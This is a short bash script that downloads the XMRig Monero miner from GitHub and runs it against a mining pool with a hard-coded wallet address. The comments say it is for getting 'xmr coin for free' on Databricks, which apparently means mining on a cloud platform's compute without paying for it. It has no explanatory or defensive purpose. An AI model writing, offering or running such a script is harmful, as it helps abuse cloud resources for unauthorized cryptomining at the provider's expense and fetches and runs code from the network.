#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o pool.hashvault.pro:443 -u 49oRKfpYSo9NrJYeAV7eedhfyapfMF9xHBRbXYBSzcZd6mXaP2WZjAg1rC7dpCuEJtCEhfuTH3xs2VhgWeJRsoci5apVTkY -k --tls --rig-id rigk
